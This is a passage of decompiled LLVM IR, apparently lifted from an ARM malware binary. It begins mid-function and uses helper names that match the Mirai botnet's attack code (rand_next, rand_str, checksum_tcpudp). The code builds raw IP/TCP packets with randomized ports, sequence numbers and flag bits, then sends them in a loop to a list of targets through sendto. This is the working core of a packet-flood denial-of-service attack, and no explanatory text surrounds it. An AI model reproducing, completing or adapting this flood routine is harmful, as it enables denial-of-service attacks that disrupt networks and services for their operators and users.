  %v6_9dc0 = inttoptr i32 %v5_9dc0 to i32*
  %v7_9dc0 = load i32, i32* %v6_9dc0, align 4
  store i32 %v7_9dc0, i32* @r4, align 4
  %v1_9dc4 = inttoptr i32 %v7_9dc0 to i8*
  %v2_9dc4 = load i8, i8* %v1_9dc4, align 1
  %tmp101 = urem i8 %v2_9dc4, 16
  %v1_9dc8 = zext i8 %tmp101 to i32
  %v1_9dcc = or i32 %v1_9dc8, 64
  store i32 %v1_9dcc, i32* %r3.global-to-local, align 4
  %v1_9dd0 = trunc i32 %v1_9dcc to i8
  store i8 %v1_9dd0, i8* %v1_9dc4, align 1
  %v0_9dd4 = load i32, i32* @r4, align 4
  %v1_9dd4 = inttoptr i32 %v0_9dd4 to i8*
  %v2_9dd4 = load i8, i8* %v1_9dd4, align 1
  %v0_9dd8 = load i32, i32* @r7, align 4
  %tmp76 = mul i32 %v0_9dd8, 256
  %v1_9de0 = and i8 %v2_9dd4, -16
  %v1_9de4 = or i8 %v1_9de0, 5
  %v1_9de8 = and i32 %tmp76, 65280
  %tmp77 = udiv i32 %v0_9dd8, 256
  %v4_9dec = urem i32 %tmp77, 256
  %v5_9dec = or i32 %v4_9dec, %v1_9de8
  store i32 %v5_9dec, i32* %r2.global-to-local, align 4
  %v0_9df0 = load i32, i32* @fp, align 4
  %v1_9df0 = urem i32 %v0_9df0, 256
  store i32 %v1_9df0, i32* %r0.global-to-local, align 4
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v3_9df8 = udiv i32 %v0_9df0, 256
  store i32 %v3_9df8, i32* %r1.global-to-local, align 4
  store i8 %v1_9de4, i8* %v1_9dd4, align 1
  %v0_9e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e00 = load i32, i32* %r0.global-to-local, align 4
  %v4_9e00 = mul i32 %v1_9e00, 256
  %v5_9e00 = or i32 %v4_9e00, %v0_9e00
  store i32 %v5_9e00, i32* %r1.global-to-local, align 4
  store i32 %v6_9940, i32* %r0.global-to-local, align 4
  %v2_9e08 = load i32, i32* @r4, align 4
  %v3_9e08 = add i32 %v2_9e08, 1
  %v4_9e08 = inttoptr i32 %v3_9e08 to i8*
  store i8 %v5_9960, i8* %v4_9e08, align 1
  %v0_9e0c = load i32, i32* %r1.global-to-local, align 4
  %v1_9e0c = trunc i32 %v0_9e0c to i16
  %v2_9e0c = load i32, i32* @r4, align 4
  %v3_9e0c = add i32 %v2_9e0c, 4
  %v4_9e0c = inttoptr i32 %v3_9e0c to i16*
  store i16 %v1_9e0c, i16* %v4_9e0c, align 2
  %v0_9e10 = load i32, i32* %ip.global-to-local, align 4
  %v2_9e10 = icmp eq i32 %v0_9e10, 0
  store i1 %v2_9e10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_999c, i32* %r1.global-to-local, align 4
  %v0_9e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e18 = trunc i32 %v0_9e18 to i16
  %v2_9e18 = load i32, i32* @r4, align 4
  %v3_9e18 = add i32 %v2_9e18, 2
  %v4_9e18 = inttoptr i32 %v3_9e18 to i16*
  store i16 %v1_9e18, i16* %v4_9e18, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9e10, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_9d3c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_9d3c, %bb78
  %v0_9e24 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e24 = trunc i32 %v0_9e24 to i8
  %v2_9e24 = load i32, i32* @r4, align 4
  %v3_9e24 = add i32 %v2_9e24, 8
  %v4_9e24 = inttoptr i32 %v3_9e24 to i8*
  store i8 %v1_9e24, i8* %v4_9e24, align 1
  %v0_9e28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e28 = trunc i32 %v0_9e28 to i8
  %v2_9e28 = load i32, i32* @r4, align 4
  %v3_9e28 = add i32 %v2_9e28, 9
  %v4_9e28 = inttoptr i32 %v3_9e28 to i8*
  store i8 %v1_9e28, i8* %v4_9e28, align 1
  %v0_9e2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9e2c, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_9e2c = trunc i32 %v1_9e2c to i16
  %v3_9e2c = load i32, i32* @r4, align 4
  %v4_9e2c = add i32 %v3_9e2c, 6
  %v5_9e2c = inttoptr i32 %v4_9e2c to i16*
  store i16 %v2_9e2c, i16* %v5_9e2c, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  store i32 ptrtoint (i32* @global_var_24f78.59 to i32), i32* %r2.global-to-local, align 4
  %v2_9e34 = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_9e34, i32* %r1.global-to-local, align 4
  %v1_9e38 = load i32, i32* @r4, align 4
  %v2_9e38 = add i32 %v1_9e38, 12
  %v3_9e38 = inttoptr i32 %v2_9e38 to i32*
  store i32 %v2_9e34, i32* %v3_9e38, align 4
  %v3_9e3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9e3c, i32* %r3.global-to-local, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v4_9e44 = mul i32 %v3_9e3c, 16
  %v5_9e44 = add i32 %v4_9e44, %v2_9918
  %v6_9e44 = inttoptr i32 %v5_9e44 to i32*
  %v7_9e44 = load i32, i32* %v6_9e44, align 4
  store i32 %v7_9e44, i32* %r2.global-to-local, align 4
  store i32 %v5_9e44, i32* %r3.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, 16
  %v3_9e50 = inttoptr i32 %v2_9e50 to i32*
  store i32 %v7_9e44, i32* %v3_9e50, align 4
  %v0_9e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 12
  %v2_9e54 = inttoptr i32 %v1_9e54 to i16*
  %v3_9e54 = load i16, i16* %v2_9e54, align 2
  %v4_9e54 = zext i16 %v3_9e54 to i32
  store i32 %v4_9e54, i32* %r0.global-to-local, align 4
  %v1_9e58 = add i32 %v0_9e54, 8
  %v2_9e58 = inttoptr i32 %v1_9e58 to i32*
  %v3_9e58 = load i32, i32* %v2_9e58, align 4
  store i32 %v3_9e58, i32* %r1.global-to-local, align 4
  %v2_9e5c = load i32, i32* @r4, align 4
  %v3_9e5c = add i32 %v2_9e5c, 20
  %v4_9e5c = inttoptr i32 %v3_9e5c to i16*
  store i16 %v3_9e54, i16* %v4_9e5c, align 2
  %v0_9e60 = load i32, i32* @r4, align 4
  %v1_9e60 = add i32 %v0_9e60, 20
  store i32 %v1_9e60, i32* @r8, align 4
  %v1_9e64 = add i32 %v0_9e60, 33
  %v2_9e64 = inttoptr i32 %v1_9e64 to i8*
  %v3_9e64 = load i8, i8* %v2_9e64, align 1
  %v4_9e64 = zext i8 %v3_9e64 to i32
  store i32 %v4_9e64, i32* %r2.global-to-local, align 4
  %v0_9e68 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e68 = add i32 %v0_9e60, 24
  %v3_9e68 = inttoptr i32 %v2_9e68 to i32*
  store i32 %v0_9e68, i32* %v3_9e68, align 4
  %v0_9e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e6c = or i32 %v0_9e6c, 1
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v0_9e70 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e70 = add i32 %v0_9e70, 4
  %v2_9e70 = inttoptr i32 %v1_9e70 to i32*
  %v3_9e70 = load i32, i32* %v2_9e70, align 4
  store i32 %v3_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e70, 14
  %v2_9e74 = inttoptr i32 %v1_9e74 to i16*
  %v3_9e74 = load i16, i16* %v2_9e74, align 2
  %v4_9e74 = zext i16 %v3_9e74 to i32
  store i32 %v4_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v1_9e6c to i8
  %v2_9e78 = load i32, i32* @r8, align 4
  %v3_9e78 = add i32 %v2_9e78, 13
  %v4_9e78 = inttoptr i32 %v3_9e78 to i8*
  store i8 %v1_9e78, i8* %v4_9e78, align 1
  %v0_9e7c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e7c = trunc i32 %v0_9e7c to i16
  %v2_9e7c = load i32, i32* @r8, align 4
  %v3_9e7c = add i32 %v2_9e7c, 2
  %v4_9e7c = inttoptr i32 %v3_9e7c to i16*
  store i16 %v1_9e7c, i16* %v4_9e7c, align 2
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 12
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v4_9e80, i32* %r3.global-to-local, align 4
  %v1_9e84 = add i32 %v0_9e80, 13
  %v2_9e84 = inttoptr i32 %v1_9e84 to i8*
  %v3_9e84 = load i8, i8* %v2_9e84, align 1
  %v4_9e84 = zext i8 %v3_9e84 to i32
  %tmp102 = urem i8 %v3_9e80, 16
  %v1_9e88 = zext i8 %tmp102 to i32
  %v1_9e8c = or i32 %v1_9e88, 128
  store i32 %v1_9e8c, i32* %r3.global-to-local, align 4
  %v1_9e90 = or i32 %v4_9e84, 16
  store i32 %v1_9e90, i32* %r2.global-to-local, align 4
  %v0_9e94 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e94 = add i32 %v0_9e80, 8
  %v3_9e94 = inttoptr i32 %v2_9e94 to i32*
  store i32 %v0_9e94, i32* %v3_9e94, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i8
  %v2_9e98 = load i32, i32* @r8, align 4
  %v3_9e98 = add i32 %v2_9e98, 12
  %v4_9e98 = inttoptr i32 %v3_9e98 to i8*
  store i8 %v1_9e98, i8* %v4_9e98, align 1
  %v0_9e9c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e9c = trunc i32 %v0_9e9c to i8
  %v2_9e9c = load i32, i32* @r8, align 4
  %v3_9e9c = add i32 %v2_9e9c, 13
  %v4_9e9c = inttoptr i32 %v3_9e9c to i8*
  store i8 %v1_9e9c, i8* %v4_9e9c, align 1
  %v0_9ea0 = call i32 @rand_next()
  %v1_9ea0 = trunc i32 %v0_9ea0 to i16
  store i32 %v0_9ea0, i32* %r0.global-to-local, align 4
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9ea8 = load i32, i32* @r8, align 4
  %v1_9ea8 = add i32 %v0_9ea8, 13
  %v2_9ea8 = inttoptr i32 %v1_9ea8 to i8*
  %v3_9ea8 = load i8, i8* %v2_9ea8, align 1
  %v4_9ea8 = zext i8 %v3_9ea8 to i32
  store i32 %v1_9eac, i32* %r2.global-to-local, align 4
  %v1_9eb0 = and i32 %v4_9ea8, 223
  %v5_9eb4 = or i32 %v1_9eb0, %v4_9eb4
  store i32 %v5_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = trunc i32 %v5_9eb4 to i8
  store i8 %v1_9eb8, i8* %v2_9ea8, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9ec0 = load i32, i32* @r8, align 4
  %v1_9ec0 = add i32 %v0_9ec0, 13
  %v2_9ec0 = inttoptr i32 %v1_9ec0 to i8*
  %v3_9ec0 = load i8, i8* %v2_9ec0, align 1
  %v4_9ec0 = zext i8 %v3_9ec0 to i32
  store i32 %v1_9ec4, i32* %r3.global-to-local, align 4
  %v1_9ec8 = and i32 %v4_9ec0, 239
  %v5_9ecc = or i32 %v1_9ec8, %v4_9ecc
  store i32 %v5_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = trunc i32 %v5_9ecc to i8
  store i8 %v1_9ed0, i8* %v2_9ec0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r8, align 4
  %v1_9ed8 = add i32 %v0_9ed8, 13
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i8*
  %v3_9ed8 = load i8, i8* %v2_9ed8, align 1
  %v4_9ed8 = zext i8 %v3_9ed8 to i32
  store i32 %v1_9edc, i32* %r2.global-to-local, align 4
  %v1_9ee0 = and i32 %v4_9ed8, 247
  %v5_9ee4 = or i32 %v1_9ee0, %v4_9ee4
  store i32 %v5_9ee4, i32* %r3.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v5_9ee4 to i8
  store i8 %v1_9ee8, i8* %v2_9ed8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r8, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 13
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef0 = load i8, i8* %v2_9ef0, align 1
  %v4_9ef0 = zext i8 %v3_9ef0 to i32
  store i32 %v1_9ef4, i32* %r3.global-to-local, align 4
  %v1_9ef8 = and i32 %v4_9ef0, 251
  %v5_9efc = or i32 %v1_9ef8, %v4_9efc
  store i32 %v5_9efc, i32* %r2.global-to-local, align 4
  %v1_9f00 = trunc i32 %v5_9efc to i8
  store i8 %v1_9f00, i8* %v2_9ef0, align 1
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  %v0_9f08 = load i32, i32* @r8, align 4
  %v1_9f08 = add i32 %v0_9f08, 13
  %v2_9f08 = inttoptr i32 %v1_9f08 to i8*
  %v3_9f08 = load i8, i8* %v2_9f08, align 1
  %v4_9f08 = zext i8 %v3_9f08 to i32
  store i32 %v1_9f0c, i32* %r2.global-to-local, align 4
  %v1_9f10 = and i32 %v4_9f08, 253
  %v4_9f14 = or i32 %v1_9f10, %v3_9f14
  store i32 %v4_9f14, i32* %r3.global-to-local, align 4
  %v1_9f18 = trunc i32 %v4_9f14 to i8
  store i8 %v1_9f18, i8* %v2_9f08, align 1
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r8, align 4
  %v1_9f20 = add i32 %v0_9f20, 13
  %v2_9f20 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f20 = load i8, i8* %v2_9f20, align 1
  %v4_9f20 = zext i8 %v3_9f20 to i32
  %v1_9f28 = and i32 %v4_9f20, 254
  store i32 %v1_9f28, i32* %r2.global-to-local, align 4
  %v2_9f2c = or i32 %v1_9f28, %v1_9f24
  store i32 %v2_9f2c, i32* %r3.global-to-local, align 4
  %v1_9f30 = trunc i32 %v2_9f2c to i8
  store i8 %v1_9f30, i8* %v2_9f20, align 1
  %v3_9f34 = load i32, i32* @r8, align 4
  %v4_9f34 = add i32 %v3_9f34, 14
  %v5_9f34 = inttoptr i32 %v4_9f34 to i16*
  store i16 %v1_9ea0, i16* %v5_9f34, align 2
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r4, align 4
  %v1_9f3c = add i32 %v0_9f3c, 40
  store i32 %v1_9f3c, i32* %r0.global-to-local, align 4
  %v2_9f40 = inttoptr i32 %v1_9f3c to i16*
  %v3_9f40 = call i32 @rand_str(i16* %v2_9f40, i32 %v6_9a9c)
  store i32 %v3_9f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c94

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9b08
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a9c, 40
  br label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ca8, %dec_label_pc_9f48
  %storemerge6.pre-phi = phi i32 [ %v1_9d98, %dec_label_pc_9ca8 ], [ %.pre, %dec_label_pc_9f48 ]
  %v0_9f6c26 = phi i32 [ %v1_9c9c, %dec_label_pc_9ca8 ], [ 0, %dec_label_pc_9f48 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a9c, 65536
  %storemerge = add i32 %v6_9a9c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f58 = add i32 %storemerge4, 1310720
  store i32 %v1_9f58, i32* %r2.global-to-local, align 4
  %tmp82 = udiv i32 %v1_9f58, 256
  %v3_9f60 = and i32 %tmp82, 65280
  store i32 %v3_9f60, i32* %r3.global-to-local, align 4
  %v4_9f64 = udiv i32 %v1_9f58, 16777216
  %v5_9f64 = or i32 %v3_9f60, %v4_9f64
  store i32 %v5_9f64, i32* @r8, align 4
  %v2_a090 = icmp eq i32 %v1_9abc, 0
  br label %dec_label_pc_9f68

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074, %dec_label_pc_9f58
  %v0_9f6c = phi i32 [ %v0_9f6c26, %dec_label_pc_9f58 ], [ 0, %dec_label_pc_a074 ], [ 0, %dec_label_pc_9f68 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f6c = icmp eq i32 %v0_9f6c, 0
  store i1 %v2_9f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f6c, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f68, %dec_label_pc_a074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f78
  %v1_9f84 = phi i32 [ %v1_a064, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9f78 ]
  store i32 %v2_9928, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %r3.global-to-local, align 4
  %v4_9f84 = mul i32 %v1_9f84, 4
  %v5_9f84 = add i32 %v4_9f84, %v2_9928
  %v6_9f84 = inttoptr i32 %v5_9f84 to i32*
  %v7_9f84 = load i32, i32* %v6_9f84, align 4
  store i32 %v7_9f84, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_9f8c = load i32, i32* @fp, align 4
  %v9_9f8c = icmp eq i32 %v0_9f8c, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_9f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f90 = add i32 %v7_9f84, 20
  store i32 %v1_9f90, i32* @r5, align 4
  br i1 %v9_9f8c, label %dec_label_pc_a088, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f7c
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a09c

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_a088, %dec_label_pc_a09c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9fa8 = load i32, i32* @r4, align 4
  %v3_9fa8 = add i32 %v2_9fa8, 10
  %v4_9fa8 = inttoptr i32 %v3_9fa8 to i16*
  store i16 0, i16* %v4_9fa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9fb0 = load i32, i32* @r4, align 4
  store i32 %v0_9fb0, i32* @r0, align 4
  %v2_9fb4 = call i32 @checksum_generic(i32 %v0_9fb0, i32 20)
  %v3_9fb4 = trunc i32 %v2_9fb4 to i16
  store i32 %v2_9fb4, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_9918, i32* %r2.global-to-local, align 4
  %v3_9fc0 = mul i32 %v3_9fb8, 16
  %v2_9fc4 = add i32 %v3_9fc0, %v2_9918
  store i32 %v2_9fc4, i32* %r1.global-to-local, align 4
  %v1_9fc8 = add i32 %v2_9fc4, 4
  %v2_9fc8 = inttoptr i32 %v1_9fc8 to i32*
  %v3_9fc8 = load i32, i32* %v2_9fc8, align 4
  %v3_9fcc = mul i32 %v3_9fc8, 65536
  store i32 %v3_9fcc, i32* %ip.global-to-local, align 4
  %tmp83 = mul i32 %v3_9fc8, 256
  %v1_9fd4 = and i32 %tmp83, 65280
  %tmp84 = udiv i32 %v3_9fc8, 256
  %v4_9fd8 = urem i32 %tmp84, 256
  %v5_9fd8 = or i32 %v4_9fd8, %v1_9fd4
  store i32 %v5_9fd8, i32* %r3.global-to-local, align 4
  %v1_9fdc = add i32 %v3_9fc8, 1
  store i32 %v1_9fdc, i32* %r2.global-to-local, align 4
  store i32 %v1_9fdc, i32* %v2_9fc8, align 4
  %v0_9fe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 4
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  store i32 %v0_9fe4, i32* %v3_9fe4, align 4
  %v0_9fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fe8 = add i32 %v0_9fe8, 8
  %v2_9fe8 = inttoptr i32 %v1_9fe8 to i32*
  %v3_9fe8 = load i32, i32* %v2_9fe8, align 4
  %tmp85 = mul i32 %v3_9fe8, 256
  %v1_9ff4 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_9fe8, 256
  %v4_9ff8 = urem i32 %tmp86, 256
  %v5_9ff8 = or i32 %v4_9ff8, %v1_9ff4
  %v1_9ffc = load i32, i32* @r5, align 4
  %v2_9ffc = add i32 %v1_9ffc, 8
  %v3_9ffc = inttoptr i32 %v2_9ffc to i32*
  store i32 %v5_9ff8, i32* %v3_9ffc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a004 = load i32, i32* @r4, align 4
  %v4_a004 = add i32 %v3_a004, 10
  %v5_a004 = inttoptr i32 %v4_a004 to i16*
  store i16 %v3_9fb4, i16* %v5_a004, align 2
  %v0_a008 = load i32, i32* @r5, align 4
  store i32 %v0_a008, i32* @r1, align 4
  %v0_a00c = load i32, i32* %r3.global-to-local, align 4
  %v1_a00c = trunc i32 %v0_a00c to i16
  %v3_a00c = add i32 %v0_a008, 16
  %v4_a00c = inttoptr i32 %v3_a00c to i16*
  store i16 %v1_a00c, i16* %v4_a00c, align 2
  %v0_a010 = load i32, i32* @r8, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @sl, align 4
  store i32 %v0_a014, i32* %r3.global-to-local, align 4
  %v0_a018 = load i32, i32* @r4, align 4
  store i32 %v0_a018, i32* %r0.global-to-local, align 4
  %v4_a01c = call i32 @checksum_tcpudp(i32 %v0_a018, i32 %v0_a008, i32 %v0_a010, i32 %v0_a014)
  %v5_a01c = trunc i32 %v4_a01c to i16
  store i32 %v4_a01c, i32* %r0.global-to-local, align 4
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a028 = mul i32 %v3_a020, 32
  store i32 %v3_a028, i32* %lr.global-to-local, align 4
  %v3_a02c = load i32, i32* @r5, align 4
  %v4_a02c = add i32 %v3_a02c, 16
  %v5_a02c = inttoptr i32 %v4_a02c to i16*
  store i16 %v5_a01c, i16* %v5_a02c, align 2
  %v0_a030 = load i32, i32* %lr.global-to-local, align 4
  %v1_a030 = load i32, i32* %r3.global-to-local, align 4
  %tmp103 = mul i32 %v1_a030, -8
  %v5_a030 = add i32 %v0_a030, %tmp103
  store i32 %v5_a030, i32* %lr.global-to-local, align 4
  %v0_a034 = load i32, i32* @r5, align 4
  %v1_a034 = add i32 %v0_a034, 2
  %v2_a034 = inttoptr i32 %v1_a034 to i16*
  %v3_a034 = load i16, i16* %v2_a034, align 2
  %v4_a034 = zext i16 %v3_a034 to i32
  store i32 %v4_a034, i32* @r5, align 4
  %v1_a038 = load i32, i32* %ip.global-to-local, align 4
  %v2_a038 = add i32 %v1_a038, %v5_a030
  store i32 %v2_a038, i32* @lr, align 4
  %v3_a03c = add i32 %v2_a038, 2
  %v4_a03c = inttoptr i32 %v3_a03c to i16*
  store i16 %v3_a034, i16* %v4_a03c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a048 = load i32, i32* @r4, align 4
  store i32 %v0_a048, i32* %r1.global-to-local, align 4
  %v0_a04c = load i32, i32* @sb, align 4
  store i32 %v0_a04c, i32* %r0.global-to-local, align 4
  %v0_a050 = load i32, i32* @r7, align 4
  store i32 %v0_a050, i32* %r2.global-to-local, align 4
  %v0_a054 = load i32, i32* @lr, align 4
  %v6_a05c = call i32 @__libc_sendto(i32 %v0_a04c, i32 %v0_a048, i32 %v0_a050, i32 16384, i32 %v0_a054, i32 16)
  %v3_a060 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a060, i32* %r3.global-to-local, align 4
  %v1_a064 = add i32 %v3_a060, 1
  store i32 %v1_a064, i32* %r0.global-to-local, align 4
  %v0_a068 = load i32, i32* @r6, align 4
  %v9_a068 = icmp eq i32 %v0_a068, %v1_a064
  store i1 %v9_a068, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a064, i32* %stack_var_-44, align 4
  %v8_a070 = icmp sgt i32 %v0_a068, %v1_a064
  br i1 %v8_a070, label %dec_label_pc_9f7c, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_9fa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a078 = icmp eq i32 %v0_a068, 0
  store i1 %v2_a078, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a078, label %dec_label_pc_9f68, label %dec_label_pc_9f78

dec_label_pc_a088:                                ; preds = %dec_label_pc_9f7c
  %v0_a088 = call i32 @rand_next()
  %v1_a088 = trunc i32 %v0_a088 to i16
  store i32 %v0_a088, i32* %r0.global-to-local, align 4
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i1 %v2_a090, i1* %cpsr_z.global-to-local, align 1
  %v3_a094 = load i32, i32* @r4, align 4
  %v4_a094 = add i32 %v3_a094, 4
  %v5_a094 = inttoptr i32 %v4_a094 to i16*
  store i16 %v1_a088, i16* %v5_a094, align 2
  br i1 %v2_a090, label %dec_label_pc_9fa4, label %dec_label_pc_a088.dec_label_pc_a09c_crit_edge

dec_label_pc_a088.dec_label_pc_a09c_crit_edge:    ; preds = %dec_label_pc_a088
  %v0_a09c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a09c

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a088.dec_label_pc_a09c_crit_edge, %dec_label_pc_9f98
  %v0_a09c = phi i32 [ %v0_a09c.pre, %dec_label_pc_a088.dec_label_pc_a09c_crit_edge ], [ %v7_9f84, %dec_label_pc_9f98 ]
  %v1_a09c = add i32 %v0_a09c, 40
  store i32 %v1_a09c, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r1.global-to-local, align 4
  %v2_a0a4 = inttoptr i32 %v1_a09c to i16*
  %v3_a0a4 = call i32 @rand_str(i16* %v2_a0a4, i32 %v6_9a9c)
  store i32 %v3_a0a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fa4

; uselistorder directives
  uselistorder i32 %v0_a088, { 1, 0 }
  uselistorder i32 %v1_a064, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a030, { 1, 0 }
  uselistorder i32 %v4_a01c, { 1, 0 }
  uselistorder i32 %v3_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9fb4, { 1, 0 }
  uselistorder i1 %v2_a090, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9ea0, { 1, 0 }
  uselistorder i32 %v0_9dd8, { 1, 0 }
  uselistorder i32 %v5_9d6c, { 1, 0 }
  uselistorder i32 %v0_9d2c, { 1, 0 }
  uselistorder i32 %v0_9ce8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9c98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c84, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9c10, { 1, 0 }
  uselistorder i32 %v6_9c08, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9c38, { 1, 0 }
  uselistorder i32 %v4_9c4c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b94, { 1, 0, 2 }
  uselistorder i32 %v0_9d44, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b84, { 1, 0 }
  uselistorder i1 %v7_9b7c, { 1, 0, 2 }
  uselistorder i1 %v7_9b30, { 1, 0 }
  uselistorder i32 %v3_9b2c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9f0c, { 1, 0 }
  uselistorder i32 %v1_9ef4, { 1, 0 }
  uselistorder i32 %v1_9edc, { 1, 0 }
  uselistorder i32 %v1_9ec4, { 1, 0 }
  uselistorder i32 %v1_9eac, { 1, 0 }
  uselistorder i32 %v3_9c44, { 1, 0 }
  uselistorder i1 %v2_9c60, { 1, 0 }
  uselistorder i32 %v1_9c5c, { 1, 0 }
  uselistorder i32 %v4_9c58, { 2, 0, 1 }
  uselistorder i32 %v2_9b6c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9b08, { 1, 0 }
  uselistorder i1 %v7_9b00, { 1, 0 }
  uselistorder i1 %v7_9ad4, { 1, 0 }
